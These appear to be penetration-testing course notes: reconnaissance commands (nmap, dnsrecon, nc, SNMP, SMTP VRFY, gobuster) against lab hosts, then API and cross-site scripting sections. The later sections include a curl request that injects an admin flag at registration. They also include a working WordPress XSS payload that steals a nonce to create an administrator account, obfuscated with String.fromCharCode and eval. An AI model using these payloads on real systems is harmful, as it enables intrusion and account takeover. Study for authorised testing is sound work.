ssh pattern for some machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```

## Info gathering
### Domain Registrar
```
whois offensive-security.com -h 192.168.210.251
```

## DNS enumeration

### DNS Recon
```
dnsrecon -d megacorpone.com -t std

dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
-t is the type of enumeration scan, in this case standard

### DNSEnum
```
dnsenum megacorpone.com
```

### Windows - nslookup
```
nslookup mail.megacorptwo.com

nslookup -type=TXT info.megacorptwo.com 192.168.50.151
```

## TCP / UDP Port Scanning

nc flags -> -u for udp, -w wait time, -z zero io

```
nc -nvv -w 1 -z 192.111.999.999 1-1999
nc -u -w 1 -z 192.111.999.999 1-1999
```

### Nmap

```
sudo nmap -sS $ip # stealth / syn scan
nmap -sT $ip # tcp connect scan
sudo nmap -sS -p 1-65535 $addr  2>/dev/null | grep open > ports.txt # scan all ports


nmap -sU $ip # udp scan

sudo nmap -sS -sU $ip # tcp + udp

# network sweeping
nmap -v -sn 192.168.50.1-253
nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt # output greppable format
nmap -v -p 80 -sn 192.168.50.1-253 # scan for port on range of networks


nmap -sT -A --top-ports=20 192.168.50.1-253 -oG top-port-sweep.txt  # TCP connect scan for top 20 points with OS version, scrpts, and traceroute -A
```

top 20 nmap ports are determined using the /usr/share/nmap/nmap-services file

```
sudo nmap -O $ip # os fingerprinting
sudo nmap -O $ip --os-scan-guess # force nmap to print os guess
```
can use script helpers for common cases

```
nmap --script http-headers $ip
nmap --script-help http-headers
```

### Windows Port Scans
```
Test-NetConnection -Port 445 192.168.50.151
# one-liner to scan ports
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null 
```

## SMB

Typically port 445, often goes hand-in-hand with NetBios (protocol on port 139 to help computers talk on LAN)

```
sudo nbtscan -r 192.168.50.0/24 # -r helps us enumerate through network

nmap -v -p 139,445 --scrpt smb-os-discovery $ip # use nmap script to enumerate smb
```

For windows, we can use `net view` to view all SMB shares

```
net view \\dc01 /all
```

## SMTP

VRFY root -> verifies email address
EXPN -> asks for membership in a mailing list

can use nc to run commands

```
nc -nv 192.168.50.8 25
VRFY root
VRFY idontexist
```

python script to run VRFY
`python3 smtp.py root 192.168.50.8`

```
#!/usr/bin/python

import socket
import sys

if len(sys.argv) != 3
        print("Usage: vrfy.py <username> <target_ip>")
        sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)

print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)

print(result)

# Close the socket
s.close()
```

### Windows 
check if SMTP is up
```
Test-NetConnection -Port 25 192.168.50.8
```

we can install telnet on windows if have admin access
```
dism /online /Enable-Feature /FeatureName:TelnetClient
```
could also transfer it from another machine if pre-installed

once installed it's similar to nc

```
telnet 192.168.50.8 25
VRFY goofy
VRFY root
```

## SNMP
can use nmap
```
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
```

alternatively use onesixtyone, need to load community strings into file
```
echo public > community
echo private >> community
echo manager >> community
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips`
```

query SNMP services with snmpwalk
-t timeout
-v1 version 1
```
snmpwalk -c public -v1 -t 10 192.168.50.151
```

```
snmpwalk -c public -v1 192.168.50.151 1.3.6.1.4.1.77.1.2.25
```

## Vulnerability scanning

### Nessus
installation

```
sudo apt install ./Nessus-10.5.0-debian10_amd64.deb
```
starting the service
```
sudo systemctl start nessusd.service
```

access on https://127.0.0.1:8834

### Nmap

can use scripts to automate
-sV -> service detection
"vuln" -> all the scripts in the category

```
sudo nmap -sV -p 443 --script "vuln" $ip
```

if we save a new script must update script db before executing
```
sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse
sudo nmap --script-updatedb
sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.50.124
```

## Web Apps

### Nmap
```
sudo nmap -sV -p 80 $ip


sudo nmap -p 80 --script=http-enum $ip
```

### Wapplyzer
https://www.wappalyzer.com/



### Gobuster

-u target ip
-t thread count (default 10)
dir == dir mode, only enumerates files and dirs

```
gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5
```

Note: don't forget about `robots.txt` and debugging page content when looking for clues!

## Api Brute Force
-p use a pattern file

```
echo {GOBUSTER}/v1 > pattern;
echo {GOBUSTER}/v2 >> pattern;
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

-i flag for curl shows response headers
```
curl -i http://192.168.50.16:5002/users/v1
```

login with curl
-d = data
```
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
```

can sometimes inject `admin: True` keys into request params
```
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
```

## Cross Site Scripting (XSS)
stored XSS -> inject exploit payload into db or cache
reflected -> malicious request link
### Cookies
Secure -> only send cookie over encrypted connection
HttpOnly -> deny JS access to cookies

JS code to grab nonce and create new admin user

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

can use jscompress.com to minify JS payload 

afterwards we can encode it in utf-16 to make sure any invalid characters don't exist

charCodeAt -> converts to UTF-16

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

can then use the eval(String.fromCharCode) in the payload to decode the JS and execute it

```
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```
